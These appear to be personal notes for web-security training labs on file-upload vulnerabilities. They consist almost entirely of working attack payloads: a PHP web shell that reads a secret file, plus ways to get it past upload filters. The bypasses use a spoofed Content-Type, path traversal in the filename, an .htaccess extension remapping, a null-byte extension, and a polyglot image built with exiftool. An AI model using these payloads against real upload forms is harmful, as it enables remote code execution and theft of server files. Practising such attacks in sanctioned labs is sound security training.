## LAB payloads
#### Lab Remote code execution via web shell upload
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Web shell upload via Content-Type restriction bypass
- Change Content-Type to image/jpeg
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Web shell upload via path traversal
```
<?php echo file_get_contents('/home/carlos/secret'); ?>

Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"

GET /files/avatars/..%2fexploit.php
```

#### Web shell upload via extension blacklist bypass
- prepare exploit exploit.l33t
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
- then add file extension .l33t to .httpaccess
```
touch .httpaccess
AddType application/x-httpd-php .l33t --> type it
```
- upload it with 
```
Content-Type: text/plain
POST /my-account/avatar
```
- after that upload exploit.l33t

#### Web shell upload via obfuscated file extension
```
<?php echo file_get_contents('/home/carlos/secret'); ?> > exploit.php%00.jpg

POST /my-account/avatar 
filename="exploit.php%00.jpg"

GET /file/avatars/exploit.php
```

#### Remote code execution via polyglot web shell upload
- Create real image.
- Add to it php script.
```
echo "<?php echo file_get_contents('/home/carlos/secret'); ?>" >> lab62.png
```
- Change extension to php.
or
- use exifTool 
- Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows: 
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```
- then find START in response